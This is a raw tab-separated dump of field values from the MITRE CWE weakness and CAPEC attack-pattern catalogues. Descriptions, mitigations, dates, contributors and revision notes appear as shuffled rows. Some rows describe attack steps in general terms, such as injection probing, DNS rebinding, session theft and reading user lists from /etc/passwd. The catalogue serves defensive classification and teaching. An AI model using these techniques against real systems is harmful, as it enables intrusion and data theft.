7516	23	An adversary exploits a configuration management system so that malicious logic is inserted into a software products build, update or deployed environment. If an adversary can control the elements included in a product's configuration management for build they can potentially replace, modify or insert code files containing malicious logic. If an adversary can control elements of a product's ongoing operational configuration management baseline they can potentially force clients receiving updates from the system to install insecure software when receiving updates from the server. Configuration management servers operate on the basis of a client pool, instructing each client on which software to install. In some cases the configuration management server will automate the software installation process. A malicious insider or an adversary who has compromised the server can alter the software baseline that clients must install, allowing the adversary to compromise a large number of satellite machines using the configuration management system. If an adversary can control elements of a product's configuration management for its deployed environment they can potentially alter fundamental security properties of the system based on assumptions that secure configurations are in place.
7686	28	CWE Content Team
24905	91	Architecture and Design
11356	39	2011-03-29
20660	35	MITRE
10944	69	Incomplete
22192	35	MITRE
6746	63	Modify Files or Directories
18599	81	Integrity
13023	46	Mobile platforms and other architectures allow the use of custom URL schemes to facilitate communication between applications. In the case of iOS, this is the only method to do inter-application communication. The implementation is at the developer's discretion which may open security flaws in the application. An example could be potentially dangerous functionality such as modifying files through a custom URL scheme.
18207	39	2008-10-14
19215	56	ChildOf
20825	62	updated Description
22940	88	Improper Validation of Integrity Check Value
6655	28	CWE Content Team
22266	101	CAPEC Content Team
16596	62	updated Description
24879	89	Detailed
21928	39	2011-06-01
20398	62	updated Demonstrative_Examples, Observed_Examples, Relationships
10811	100	The MITRE Corporation
19989	66	Windows Kernel Reference Count Vulnerabilities - Case Study
8299	62	updated Relationships
9677	39	2011-06-01
21547	62	updated Common_Consequences
17375	28	Eric Dalci
14956	39	2009-12-28
15125	62	updated Relationships
17838	62	updated Relationships
22867	56	PeerOf
7115	95	[Establish initial target access to adversary DNS] The first time the target accesses the adversary's content, the adversary's name must be resolved to an IP address. The adversary's DNS server performs this resolution, providing a short Time-To-Live (TTL) in order to prevent the target from caching the value.
24535	100	The MITRE Corporation
13426	88	Serializable Class Containing Sensitive Data
9261	28	CWE Content Team
22920	26	Architecture and Design
6450	35	MITRE
8949	63	Read Memory
12841	62	updated Potential_Mitigations, Relationships
8028	35	MITRE
13642	24	MITRE
11015	91	Implementation
19082	39	2019-01-03
19109	90	Language-Independent
20013	105	Web Based
7670	81	Other
19263	91	Architecture and Design
8390	100	The MITRE Corporation
14545	28	CWE Content Team
22106	49	1996
9346	50	Monitor traffic and resource usage and pay attention if resource exhaustion occurs.
13920	51	2017-01-12
9773	28	CWE Content Team
11731	81	Integrity
17723	50	Prevent the use of Lan Man and NT Lan Man authentication on severs and apply patch KB2871997 to Windows 7 and higher systems.
19783	56	ChildOf
13146	56	ChildOf
14715	26	Implementation
19173	62	updated Common_Consequences, Description
7352	35	MITRE
23061	35	MITRE
25404	63	Other
19411	39	2009-07-27
12067	39	2010-02-16
19039	28	CWE Content Team
22885	103	Primary
12597	72	When an authorization or authentication mechanism relies on random values to restrict access to restricted functionality, such as a session ID or a seed for generating a cryptographic key, then an attacker may access the restricted functionality by guessing the ID or key.
16086	76	2018-07-31
23591	35	MITRE
12764	35	MITRE
13000	28	CWE Content Team
10539	88	Invokable Control Element with Large Number of Outward Calls
7671	28	CWE Content Team
15025	63	Modify Files or Directories
22911	39	2010-06-21
14332	45	Variant
23284	91	Architecture and Design
15793	28	CWE Content Team
10729	28	Eric Dalci
8073	28	CWE Content Team
25092	39	2011-06-01
15964	81	Availability
20733	35	MITRE
12037	28	Eric Dalci
6656	99	SANS Software Security Institute
12138	100	The MITRE Corporation
19967	35	MITRE
7734	39	2013-07-17
14551	63	DoS: Crash, Exit, or Restart
25111	35	MITRE
16613	23	The code is too complex, as calculated using a well-defined,      quantitative measure.
11839	28	Eric Dalci
16151	40	The architecture under attack must publish or otherwise make available services that clients can attach to, either in an unauthenticated fashion, or having obtained an authentication token elsewhere. The service need not be 'discoverable', but in the event it isn't it must have some way of being discovered by an attacker. This might include listening on a well-known port. Ultimately, the likelihood of exploit depends on discoverability of the vulnerable service.
9640	104	460
23342	28	CWE Content Team
5911	35	MITRE
9440	47	Gain Privileges
5930	101	CAPEC Content Team
8247	42	Testing: Test that the implementation properly handles each case in the protocol grammar.
16392	103	Primary
21701	35	Cigital
11958	28	CWE Content Team
13252	28	CWE Content Team
21134	89	Standard
6242	28	CWE Content Team
22901	77	Architecture or Design Review
10355	39	2008-11-24
22181	56	ChildOf
15045	54	Low
8939	63	Modify Application Data
20569	85	462
23369	77	Dynamic Analysis with Manual Results Interpretation
24300	73	Obtain usernames from filesystem (e.g. list of directories in C:\Documents and Settings\ in Windows, and list in /etc/passwd in UNIX-like systems)
8225	63	Gain Privileges or Assume Identity
17211	35	MITRE
11599	80	The attacker needs to have knowledge of not only the application to exploit but also the exact nature of commands that pertain to the target operating system. This may involve, though not always, knowledge of specific assembly commands for the platform.
10394	39	2008-07-01
12885	63	Unexpected State
10177	56	CanAlsoBe
13718	35	MITRE
25362	35	MITRE
16965	35	MITRE
14683	81	Other
14651	42	If certificate pinning is being used, ensure that all relevant properties of the certificate are fully validated before the certificate is pinned, including the revoked status.
9880	39	2008-07-01
7724	39	2009-12-28
25107	35	MITRE
16338	62	updated Applicable_Platforms, Relationships, Taxonomy_Mappings, Weakness_Ordinalities
17427	62	updated Demonstrative_Examples, Description, Relationships
23745	73	Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and performs actions on the same web site
8482	46	This issue makes it more difficult to maintain the software, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.    While the interpretation of "expected range" may vary for each product or developer, CISQ recommends a default minimum of 4 layers and maximum of 8 layers.
13883	89	Detailed
22662	42	Developers should anticipate that delimiters will be injected/removed/manipulated in the input vectors of their software system. Use an appropriate combination of black lists and whitelists to ensure only valid, expected and appropriate input is processed by the system.
6575	102	ChildOf
8481	25	High
6878	73	Port mapping using network connection-based software (e.g., nmap, nessus, etc.)
8517	47	Bypass Protection Mechanism
20766	87	Web Server
23029	43	Simple
19188	91	Implementation
11612	56	ChildOf
6581	103	Primary
9797	42	Run or compile the software using features or extensions that automatically provide a protection mechanism that mitigates or eliminates buffer overflows.                   For example, certain compilers and extensions provide automatic buffer overflow detection mechanisms that are built into the compiled code. Examples include the Microsoft Visual Studio /GS flag, Fedora/Red Hat FORTIFY_SOURCE GCC flag, StackGuard, and ProPolice.
6972	28	CWE Content Team
23968	23	The software contains modules in which one module has references that cycle back to itself, i.e., there are circular dependencies.
6464	103	Primary
24621	62	updated Other_Notes
25184	91	Implementation
15852	28	Eric Dalci
13673	45	Base
20179	35	MITRE
15046	62	updated Relationships
18469	26	Implementation
6798	91	Implementation
15719	56	ChildOf
10008	62	added/updated demonstrative examples
14310	69	Incomplete
5960	101	CAPEC Content Team
8272	22	08
8397	78	High
19439	73	Create new web pages that have the legitimate site's look at feel, but contain completely new content.
8619	62	updated Applicable_Platforms
13700	35	MITRE
7303	76	2017-05-01
18821	23	The software specifies a regular expression in a way that causes data to be improperly matched or compared.
23938	90	Language-Independent
6151	39	2009-07-27
16186	35	MITRE
24077	103	Primary
24141	63	Modify Application Data
11011	59	Updated Attack_Phases, Attack_Prerequisites, Description Summary
17166	28	CWE Content Team
5974	56	ChildOf
8443	95	[Read directories or files which are not intended for public viewing.] The adversary attempts to access the discovered directories that allow access and may attempt to bypass server or application level ACLs by using manual or automated methods
24434	47	Read Data
7952	62	updated Common_Consequences, Demonstrative_Examples, Relationships
16101	62	updated Relationships
13387	101	CAPEC Content Team
16211	63	Other
11861	46	As data is parsed, an injected/absent/malformed delimiter may cause the process to take unexpected actions.
24595	28	CWE Content Team
12244	102	ChildOf
8031	72	Improper signed-to-unsigned conversions without proper checking can sometimes trigger buffer overflows which can be used to execute arbitrary code. This is usually outside the scope of a program's implicit security policy.
22968	39	2019-01-03
7041	62	updated Relationships
19715	28	CWE Content Team
23160	28	CWE Content Team
9143	56	ChildOf
15351	59	Updated Related_Weaknesses
19820	100	The MITRE Corporation
19589	39	2014-07-30
7577	35	MITRE
13492	103	Primary
18754	52	This weakness can often be detected using automated static analysis tools. Many modern tools use data flow analysis or constraint-based techniques to minimize the number of false positives.                   Automated static analysis generally does not account for environmental considerations when reporting out-of-bounds memory operations. This can make it difficult for users to determine which warnings should be investigated first. For example, an analysis tool might report buffer overflows that originate from command line arguments in a program that is not expected to run with setuid or other special privileges.
7884	26	Implementation
24504	56	ChildOf
7841	62	updated Potential_Mitigations
6903	28	CWE Content Team
19976	79	Authorization
20402	95	[Try to exploit the LDAP injection vulnerability] After determining that a given input is vulnerable to LDAP Injection, hypothesize what the underlying query looks like. Possibly using a tool, iteratively try to add logic to the query to extract information from the LDAP, or to modify or delete information in the LDAP.
13169	90	Language-Independent
22442	35	MITRE
10151	56	ChildOf
6376	100	The MITRE Corporation
21088	31	1000
21646	90	C++
18532	23	The software performs a comparison between two entities, but the entities are of different, incompatible types that cannot be guaranteed to provide correct results when they are directly compared.
21134	97	Local Code Inclusion
6621	101	CAPEC Content Team
8929	62	updated Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities
16999	35	MITRE
9654	85	58
18408	56	ChildOf
23096	35	MITRE
11886	54	Medium
17477	100	The MITRE Corporation
22161	97	TypoSquatting
13752	72	This weakness can sometimes trigger buffer overflows which can be used to execute arbitrary code. This is usually outside the scope of a program's implicit security policy.
14022	63	Unexpected State
23345	59	Updated Description Summary, Related_Attack_Patterns
17622	91	Architecture and Design
10322	63	Bypass Protection Mechanism
13454	35	MITRE
11055	50	Implement best practices with respect to memory management, including the freeing of all allocated resources at all exit points and ensuring consistency with how and where memory is freed in a function.
13995	62	updated Demonstrative_Examples
16468	39	2012-05-11
24834	90	C++
23271	28	CWE Content Team
7164	73	Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.
6869	68	An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization.
18891	28	CWE Content Team
12168	62	updated Relationships, Taxonomy_Mappings
17454	39	2008-10-14
12713	46	This could allow attackers to execute unexpected, dangerous commands directly on the operating system. This weakness can lead to a vulnerability in environments in which the attacker does not have direct access to the operating system, such as in web applications. Alternately, if the weakness occurs in a privileged program, it could allow the attacker to specify commands that normally would not be accessible, or to call alternate commands with privileges that the attacker does not have. The problem is exacerbated if the compromised process does not follow the principle of least privilege, because the attacker-controlled commands may run with special system privileges that increases the amount of damage.             There are at least two subtypes of OS command injection:                                                The application intends to execute a single, fixed program that is under its own control. It intends to use externally-supplied inputs as arguments to that program. For example, the program might use system("nslookup [HOSTNAME]") to run nslookup and allow the user to supply a HOSTNAME, which is used as an argument. Attackers cannot prevent nslookup from executing. However, if the program does not remove command separators from the HOSTNAME argument, attackers could place the separators into the arguments, which allows them to execute their own program after nslookup has finished executing.                   The application accepts an input that it uses to fully select which program to run, as well as which commands to use. The application simply redirects this entire command to the operating system. For example, the program might use "exec([COMMAND])" to execute the [COMMAND] that was supplied by the user. If the COMMAND is under attacker control, then the attacker can execute arbitrary commands or programs. If the command is being executed using functions like exec() and CreateProcess(), the attacker might not be able to combine multiple commands together in the same line.                                          From a weakness standpoint, these variants represent distinct programmer errors. In the first variant, the programmer clearly intends that input from untrusted parties will be part of the arguments in the command to be executed. In the second variant, the programmer does not intend for the command to be accessible to any untrusted party, but the programmer probably has not accounted for alternate ways in which malicious attackers can provide input.
11645	23	An attacker can craft special user-controllable input consisting of XPath expressions to inject the XML database and bypass authentication or glean information that he normally would not be able to. XPath Injection enables an attacker to talk directly to the XML database, thus bypassing the application completely. XPath Injection results from the failure of an application to properly sanitize input used as part of dynamic XPath expressions used to query an XML database.
21371	62	updated Applicable_Platforms, Description, Relationships, Other_Notes, Taxonomy_Mappings
11925	92	Exploit
8568	73	Inject other database-specific commands into input fields susceptible to SQL Injection. The adversary can determine the type of database that is running by checking whether the query executed successfully or not (i.e. whether the adversary received a normal response from the server or not).
8866	85	439
14421	62	updated Description, Name
25004	88	Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
8009	39	2014-02-18
11010	39	2014-07-30
20811	55	CAPEC Content Team
21418	49	2005
15605	104	232
23769	26	Implementation
17006	101	CAPEC Content Team
14591	90	C
21492	28	CWE Content Team
9267	103	Primary
6697	69	Draft
23322	95	[Identify Target] Attacker identifies client components to extract information from. These may be binary executables, class files, shared libraries (e.g., DLLs), configuration files, or other system files.
14101	69	Incomplete
18215	96	2010-12-12
25174	95	[Steal session IDs, credentials, page content, etc.] As the attacker succeeds in exploiting the vulnerability, he can choose to steal user's credentials in order to reuse or to analyze them later on.
18365	74	2
21586	54	Low
23705	35	MITRE
11391	46	This issue can make the software perform more slowly.  If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.   While the interpetation of "large number of data accesses/queries" may vary for each product or developer, CISQ recommends a default maximum of 2 data accesses per function/method.
22204	100	The MITRE Corporation
8060	97	Using Unicode Encoding to Bypass Validation Logic
21256	56	ChildOf
8738	23	An adversary may execute a flooding attack using the TCP protocol with the intent to deny legitimate users access to a service. These attacks exploit the weakness within the TCP protocol where there is some state information for the connection the server needs to maintain.
16637	91	Implementation
24609	40	The targeted application must create names for temporary files using a predictable procedure, e.g. using sequentially increasing numbers.
18006	35	MITRE
12359	28	CWE Content Team
24114	28	CWE Content Team
12562	100	The MITRE Corporation
10121	78	High
22424	86	http://manicode.blogspot.com/2010/06/injection-safe-templating-languages_30.html
6486	62	updated Description, Name
21646	69	Draft
22461	80	To deploy a hidden process or malware on the system to automatically collect audio and video data.
11797	85	590
6927	35	MITRE
24499	100	The MITRE Corporation
24394	42	Check the results of all functions that return a value and verify that the value is expected.
6511	43	Simple
24718	61	Draft
6360	63	Varies by Context
25293	50	Use static analysis tools to find race conditions.
19095	39	2017-11-08
19288	57	Indirect
10089	43	Simple
15139	40	An authentication mechanism or subsystem implementing some form of authentication such as passwords, digest authentication, security certificates, etc.
24191	80	To probe a system remotely without detection requires careful planning and patience.
15104	46	This can have security implications when the associated resource is expected to have certain properties or values, such as a variable that determines whether a user has been authenticated or not.
5865	85	182
9899	28	CWE Content Team
12739	21	CLASP
23632	63	Reduce Reliability
17296	35	MITRE
12650	31	1000
23771	35	MITRE
19405	63	DoS: Amplification
15416	62	updated References
6480	28	CWE Content Team
15683	39	2012-05-11
17954	63	DoS: Crash, Exit, or Restart
11889	88	Dead Code
12110	59	Updated Related_Weaknesses
25414	73	Sniff network packets containing password hashes.
14022	81	Integrity
8558	103	Primary
16765	28	CWE Content Team
19989	48	11
18779	43	Simple
13992	78	High
11706	54	Low
12415	39	2019-09-23
20878	28	CWE Content Team
11269	103	Primary
7304	24	MITRE
24258	35	MITRE
22900	69	Incomplete
9797	93	Defense in Depth
5634	23	When converting from one data type to another, such as long to integer, data can be omitted or translated in a way that produces unexpected values. If the resulting values are used in a sensitive context, then dangerous behaviors may occur.
20027	42	Ensure that all forms extend one of the Validation Classes.
11631	103	Primary
24688	31	699
25146	31	1000
12189	101	CAPEC Content Team
11797	23	An adversary performing this type of attack drops packets destined for a target IP address. The aim is to prevent access to the service hosted at the target IP address.
17996	39	2008-07-01
6725	81	Availability
13911	42	If privileged APIs do not shed their privilege prior to returning to the calling code, then calling code needs to shed these privileges immediately and safely right after the call to the privileged APIs. In particular, the calling code needs to ensure that a privileged thread of execution will never be returned to the user or made available to user-controlled processes.
10088	35	Cigital
13721	62	updated Applicable_Platforms, References
11611	39	2013-07-17
24192	39	2019-01-03
16229	63	Alter Execution Logic
10089	90	Language-Independent
21169	39	2011-06-27
16967	33	Jerome H. Saltzer
7135	35	MITRE
21794	31	1000
25271	35	MITRE
12782	35	MITRE
10517	39	2012-05-11
10867	90	Language-Independent
15699	78	Medium
15601	62	updated Relationships
11658	95	[Cause specific data to be cached] An attacker sends bogus request to the target, and then floods responses that trick a cache to remember malicious responses, which are wrong answers of queries.
9259	102	ChildOf
19003	35	MITRE
12030	56	ChildOf
8814	80	Ability to develop, deploy, and maintain a stealth malicious backdoor program remotely in what is essentially a hostile environment.
11490	42	Developers should anticipate that null characters or null bytes will be injected/removed/manipulated in the input vectors of their software system. Use an appropriate combination of black lists and whitelists to ensure only valid, expected and appropriate input is processed by the system.
22428	35	MITRE
6526	55	CAPEC Content Team
19023	62	updated Potential_Mitigations
19476	62	updated Common_Consequences
16770	62	updated Potential_Mitigations
24389	90	Language-Independent
19216	62	updated Relationships
13250	76	2015-12-07
7611	39	2009-07-27
7049	56	ChildOf
22915	39	2013-07-17
25048	39	2011-06-27
21717	62	updated Relationships
24972	101	CAPEC Content Team
10405	28	CWE Content Team
23063	62	updated Relationships, Taxonomy_Mappings
13070	92	Exploit
15327	39	2019-01-03
20024	35	MITRE
22837	39	2008-09-08
12508	79	Authorization
21342	35	MITRE
18842	74	3
12750	35	MITRE
10867	45	Base
24683	56	ChildOf
13701	23	A software system that accepts path input in the form of internal space ('file(SPACE)name') without appropriate validation can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.
12565	63	Hide Activities
22292	28	Eric Dalci
21852	26	Operation
8736	39	2015-12-07
16554	62	updated Relationships
14318	103	Primary
15200	26	Operation
16533	79	Confidentiality
22536	61	Draft
13992	50	Put together a strong password policy and make sure that all user created passwords comply with it. Alternatively automatically generate strong passwords for users.
17064	62	updated Relationships, Taxonomy_Mappings
12731	94	Disabling a target domain at the infrastructure level denies the availability of its service to the user.
16372	42	Save an index variable. This is the recommended solution. Rather than subtract pointers from one another, use an index variable of the same size as the pointers in question. Use this variable to "walk" from one pointer to the other and calculate the difference. Always sanity check this number.
6988	103	Primary
6351	39	2012-10-30
21238	97	Cross-Site Flashing
6681	28	CWE Content Team
22049	80	An attacker can simply overflow a buffer by inserting a long string into an attacker-modifiable injection vector. The result can be a DoS.
21676	62	updated Relationships
25128	57	Resultant
24657	55	CAPEC Content Team
10986	35	Cigital
16138	56	ChildOf
9695	62	updated Alternate_Terms, Relationships, Other_Notes, Relationship_Notes, Relevant_Properties, Taxonomy_Mappings, Weakness_Ordinalities
13993	94	The adversary's injection of additional content into a communication channel negatively impacts the integrity of that channel.
10771	79	Authorization
15082	39	2011-06-01
15608	86	http://software-security.sans.org/blog/2010/03/25/top-25-series-rank-23-open-redirect
6845	69	Draft
9575	35	MITRE
23393	89	Detailed
21427	24	MITRE
23823	102	ChildOf
16153	23	A covert storage channel transfers information through the setting of bits by one program and the reading of those bits by another. What distinguishes this case from that of ordinary operation is that the bits are used to convey encoded information.
25128	67	High
10484	28	CWE Content Team
24155	24	MITRE
18249	28	CWE Content Team
9095	90	Language-Independent
10005	35	MITRE
22115	72	An attacker could gain access to and modify sensitive data or system information.
18532	45	Base
7642	39	2009-12-28
19586	63	Bypass Protection Mechanism
16684	92	Explore
14632	74	1
20678	62	updated Other_Notes
24836	62	updated Applicable_Platforms
22534	28	CWE Content Team
17755	39	2014-07-30
21633	35	MITRE
11088	62	updated Applicable_Platforms, Relationships
8674	35	KDM Analytics
17201	81	Integrity
5949	28	CWE Content Team
15572	39	2017-11-08
17115	35	MITRE
14704	88	Improper Handling of URL Encoding (Hex Encoding)
24676	81	Availability
14175	23	This pattern of attack is defined by the selection of messages distributed over via multicast or public information channels that are intended for another client by determining the parameter value assigned to that client. This attack allows the adversary to gain access to potentially privileged information, and to possibly perpetrate other attacks through the distribution means by impersonation. If the channel/message being manipulated is an input rather than output mechanism for the system, (such as a command bus), this style of attack could be used to change the adversary's identifier to more a privileged one.
16678	76	2015-12-07
23685	31	1000
24274	39	2009-07-27
12287	91	Implementation
19620	66	Top 25 Series - Rank 25 - Race Conditions
15355	96	2019-03-25
14249	28	CWE Content Team
18860	31	1000
9455	26	Architecture and Design
18350	45	Variant
15673	28	CWE Content Team
7531	44	Moderate
15465	103	Primary
9683	74	3
10075	79	Confidentiality
18121	56	ChildOf
11535	63	Execute Unauthorized Code or Commands
6959	39	2014-07-30
14322	45	Class
20750	35	MITRE
10274	70	Wikipedia
11784	39	2019-09-19
6677	53	The MITRE Corporation
22649	62	updated Common_Consequences
10757	62	updated Relationships, Taxonomy_Mappings
23362	35	MITRE
16256	28	CWE Content Team
22637	77	Automated Static Analysis - Source Code
24897	39	2014-07-30
9571	23	The software does not properly handle special paths that may identify the data or resource fork of a file on the HFS+ file system.
13486	28	CWE Content Team
25405	62	updated Modes_of_Introduction, References, Relationships
15432	63	Gain Privileges or Assume Identity
12060	35	MITRE
11075	25	Low
15966	35	MITRE
24514	39	2019-01-03
21415	28	CWE Content Team
23521	39	2009-12-28
20313	62	updated Applicable_Platforms, References
21158	39	2008-09-08
10957	39	2019-06-20
20429	45	Base
14348	35	MITRE
18321	103	Primary
13446	35	MITRE
9538	62	updated Potential_Mitigations
22047	62	updated Common_Consequences
9163	39	2017-11-08
21704	101	CAPEC Content Team
25071	42	Use a mechanism that can validate the identity of the source, such as a certificate, and validate the integrity of data to ensure that it cannot be modified in transit using a man-in-the-middle attack.                   When designing functionality of actions in the URL scheme, consider whether the action should be accessible to all mobile applications, or if a whitelist of applications to interface with is appropriate.
10570	28	Eric Dalci
18647	72	Code injection attacks can lead to loss of data integrity in nearly all cases as the control-plane data injected is always incidental to data recall or writing. Additionally, code injection can often result in the execution of arbitrary code.
12329	62	updated Relationships, Taxonomy_Mappings
17088	26	Architecture and Design
19908	39	2017-11-08
17717	21	PLOVER
6700	72	An attacker could modify sensitive data or program variables.
20050	35	MITRE
12398	90	Language-Independent
6853	43	Simple
8812	28	CWE Content Team
22616	62	updated Relationships, Taxonomy_Mappings
13372	35	MITRE
21168	31	1000
5756	92	Exploit
17990	62	updated Applicable_Platforms, Detection_Factors, Functional_Areas, Observed_Examples, Potential_Mitigations, References, Related_Attack_Patterns, Relationships, Taxonomy_Mappings, Terminology_Notes
18158	33	Christian Szegedy
12732	102	ChildOf
20336	39	2017-11-08
9090	35	MITRE
10806	81	Integrity
14672	27	Fuzzing tools, which automatically generate and send message variants, are necessary for this attack. The attacker must have sufficient access to send messages to the target. The attacker must also have the ability to observe the target application's log and/or error messages in order to collect information about the target.
17645	39	2008-08-01
22140	50	Use an abstraction library to abstract away risky APIs. Not a complete solution.
5705	28	CWE Content Team
24753	59	Updated Related_Attack_Patterns
7223	43	Simple
21116	51	2018-07-31
7462	28	CWE Content Team
7589	35	Cigital
23407	77	Dynamic Analysis with Manual Results Interpretation
18156	28	CWE Content Team
6397	62	Suggested OWASP Top Ten 2004 mapping
7942	86	https://msdn.microsoft.com/en-us/library/bb288454.aspxy
18011	56	ChildOf
6099	62	updated Relationships, Other_Notes, Taxonomy_Mappings
14783	36	http://www.webappsec.org/projects/articles/071105.shtml
9509	56	ChildOf
15865	35	MITRE
23066	40	The target must transmit data over a medium that is accessible to the adversary.
9815	70	A Lazy Pen Tester's Guide to Testing Flash Applications
16287	101	CAPEC Content Team
8640	28	CWE Content Team
7576	100	The MITRE Corporation
9308	62	updated Detection_Factors, Potential_Mitigations, References
12581	39	2013-02-21
5823	39	2008-09-08
5963	35	MITRE
19689	39	2008-09-08
6999	39	2014-07-30
9185	56	ChildOf
24466	92	Exploit
11674	80	If the client site token is encrypted.
6431	39	2019-06-20
14381	103	Primary
23153	95	[Survey the application for user-controllable inputs] Using a browser or an automated tool, an attacker follows all public links and actions on a web site. He records all the links, the forms, the resources accessed and all other potential entry-points for the web application.
18534	35	MITRE
21692	89	Standard
13316	35	MITRE
19953	62	updated References, Relationships
11794	28	CWE Content Team
9040	31	1000
11247	35	MITRE
10602	100	The MITRE Corporation
9532	35	MITRE
12170	28	CWE Content Team
14901	62	updated Relationships, Taxonomy_Mappings
21303	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit
14592	56	ChildOf
19872	50	Design: Utilize strict type, character, and encoding enforcement.
12342	62	updated Relationships
8776	88	Sensitive Information Uncleared Before Release
17264	47	Read Data
19504	79	Availability
5983	62	updated Time_of_Introduction
10650	35	MITRE
20310	39	2017-11-08
6968	47	Modify Data
22117	39	2014-07-30
22233	42	Run the code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.                   OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.                   This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.                   Be careful to avoid CWE-243 and other weaknesses related to jails.
25184	42	With Struts, write all data from form beans with the bean's filter attribute set to true.
6297	31	1000
6895	28	CWE Content Team
9384	62	updated Related_Attack_Patterns, Relationships
8530	28	CWE Content Team
24765	62	updated Demonstrative_Examples
14228	62	updated Alternate_Terms, Applicable_Platforms, Relationships, Other_Notes, Relationship_Notes, Taxonomy_Mappings, Weakness_Ordinalities
8709	74	2
9746	62	updated Potential_Mitigations, Relationships
6788	33	David LeBlanc
9801	35	MITRE
8894	31	699
12148	78	High
17528	88	Inappropriate Whitespace Style
22962	43	Simple
25128	45	Class
14920	81	Other
21275	28	CWE Content Team
9790	35	MITRE
17512	91	Implementation
25084	91	Operation
11815	35	MITRE
23704	39	2008-10-10
9815	30	Rudra K. Sinha Roy
6176	55	CAPEC Content Team
8587	39	2008-09-08
7475	78	High
11294	62	updated Modes_of_Introduction, Other_Notes
15833	62	updated Relationships, Taxonomy_Mappings
5866	39	2009-05-27
10354	35	Cigital
11781	88	Data Access from Outside Expected Data Manager Component
24643	89	Standard
12988	28	CWE Content Team
14573	47	Modify Data
12524	32	Insecure.com LLC, ISBN: 978-0-9799587-1-7
12984	62	updated Relationships
17474	62	updated Demonstrative_Examples
12471	39	2010-02-16
17685	81	Integrity
11182	89	Detailed
14157	39	2008-09-08
7056	79	Integrity
6454	101	CAPEC Content Team
25339	100	The MITRE Corporation
13891	39	2011-09-13
24229	28	CWE Content Team
15284	35	MITRE
11509	39	2011-06-01
24703	91	Architecture and Design
17366	47	Gain Privileges
23007	62	updated Potential_Mitigations
22200	27	Resources required vary depending on the nature of the attack. Possible tools needed by an attacker could include tools to create custom network packets, specific client software, and tools to capture network traffic. Many variants of this attack require no attacker resources, however.
21746	62	updated Relationships, Taxonomy_Mappings
7131	28	CWE Content Team
9295	101	CAPEC Content Team
19872	61	Draft
10736	39	2011-06-01
20525	33	Riyaz Ahemed Walikar
14482	42	In Java, use the ReentrantLock Class.
11940	62	updated Applicable_Platforms, Name, Relationships, Taxonomy_Mappings
15798	39	2012-05-11
7096	35	MITRE
10184	55	CAPEC Content Team
13831	63	DoS: Amplification
6413	35	MITRE
18968	53	The MITRE Corporation
20748	33	Microsoft Security Vulnerability Research & Defense
19482	26	Implementation
6943	88	Improper Input Validation
10631	44	SOAR Partial
12250	62	updated Relationships
16318	33	blexim
7970	101	CAPEC Content Team
11499	61	Draft
6102	81	Integrity
11143	62	updated Demonstrative_Examples, Description, Name, Potential_Mitigations
22580	56	ChildOf
14296	35	MITRE
7731	62	updated Relationships
10447	39	2010-04-05
9699	86	http://www.securityfocus.com/archive/1/303509
21432	79	Confidentiality
23654	35	MITRE
13543	49	2013
11362	59	Updated References
20894	56	ChildOf
14779	21	PLOVER
21896	35	MITRE
11126	47	Execute Unauthorized Commands
22165	28	CWE Content Team
21658	28	CWE Content Team
19960	26	Implementation
14469	62	updated Description, Name
12120	61	Draft
18756	23	A directory listing is inappropriately exposed, yielding potentially sensitive information to attackers.
6760	81	Confidentiality
23316	66	Thread-safe webapps using Spring
9052	62	updated Related_Attack_Patterns
13243	31	1000
14540	91	Implementation
8417	62	updated Description
11221	39	2011-03-29
23922	39	2012-05-11
24782	28	CWE Content Team
16254	25	High
6524	43	Simple
23610	91	Architecture and Design
17259	39	2011-03-29
5710	28	CWE Content Team
18691	103	Primary
11603	54	Medium
21055	23	The adversary tailors their communication to the language and thought patterns of the target thereby weakening barriers or reluctance to communication. This method is a way of building rapport with a target by matching their speech patterns and the primary ways or dominant senses with which they make abstractions. This technique can be used to make the target more receptive to sharing information because the adversary has adapted their communication forms to match those of the target. When skillfully employed, the target is likely to be unaware that they are being manipulated.
13236	28	CWE Content Team
10619	44	SOAR Partial
10448	28	CWE Content Team
21162	39	2011-06-01
17839	86	http://www.net-security.org/dl/insecure/INSECURE-Mag-17.pdf
15754	62	updated Relationships
7612	97	Modify Existing Service
16860	39	2015-12-07
7670	72	When the regular expression is not correctly specified, data might have a different format or type than the rest of the program expects, producing resultant weaknesses or errors.
11704	103	Primary
7628	80	Open source and commercial tools are available for this attack.
5768	39	2008-07-01
6105	28	CWE Content Team
21310	45	Variant
18231	21	PLOVER
20919	40	The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card.
7530	62	updated Observed_Examples
15559	73	Assume that a user will unintentionally use the homophone in the URL, leading the user to the SoundSquatted domain.
21040	28	CWE Content Team
17220	28	CWE Content Team
13522	39	2009-07-27
21735	23	An adversary targets a specific user or group with a Phishing (CAPEC-98) attack tailored to a category of users in order to have maximum relevance and deceptive capability. Spear Phishing is an enhanced version of the Phishing attack targeted to a specific user or group. The quality of the targeted email is usually enhanced by appearing to come from a known or trusted entity. If the email account of some trusted entity has been compromised the message may be digitally signed. The message will contain information specific to the targeted users that will enhance the probability that they will follow the URL to the compromised site. For example, the message may indicate knowledge of the targets employment, residence, interests, or other information that suggests familiarity. As soon as the user follows the instructions in the message, the attack proceeds as a standard Phishing attack.
22781	39	2011-03-29
10628	39	2014-06-23
22940	90	Language-Independent
17315	46	As data is parsed, an injected/absent/malformed delimiter may cause the process to take unexpected actions.
10579	49	2008
16738	39	2017-11-08
15794	39	2008-07-01
13733	32	The MITRE Corporation
19333	76	2019-09-30
22834	35	MITRE
